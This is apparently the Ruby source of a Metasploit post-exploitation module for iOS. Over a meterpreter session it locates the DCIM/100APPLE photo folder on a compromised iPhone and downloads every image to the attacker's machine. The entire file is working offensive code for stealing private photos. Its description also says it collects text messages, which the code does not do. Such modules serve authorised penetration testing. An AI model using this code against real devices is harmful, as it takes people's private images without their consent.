##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Auxiliary::Report

  def initialize(info={})
    super(update_info(info,
      'Name'          =>  'iOS Image Gatherer',
      'Description'   =>  %q{
        This module collects images and text messages from iPhones.
      },
      'License'       =>  MSF_LICENSE,
      'Author'        =>  [ 'Shelby Pace' ], # Metasploit Module
      'Platform'      =>  [ 'apple_ios' ],
      'SessionTypes'  =>  [ 'meterpreter' ]
    ))
  end

  # location of images: /private/var/mobile/Media/DCIM/100APPLE
  def check_for_img_path
    directory?('/private/var/mobile/Media/DCIM/100APPLE')
  end

  def enum_img
    path = File.join(Msf::Config.loot_directory, Rex::Text.rand_text_alpha(6))
    local_path = File.expand_path(path)

    unless check_for_img_path
      print_bad('Default image path not found')
      return
    end
    print_good('Image path found. Will begin searching for images...')

    cd('/private/var/mobile/Media/DCIM/100APPLE')
    ios_imgs = dir(pwd)
    print_status("Directory for iOS images: #{local_path}")

    opts = { "block_size" => 262144 }
    ios_imgs.each do |img|
      begin
        print_status("Downloading image: #{img}")
        client.fs.file.download_file("#{local_path}/#{img}", "#{pwd}/#{img}", opts)
      rescue
        print_error("#{img} could not be downloaded")
      end
    end
  end

  def run
    enum_img
  end
end
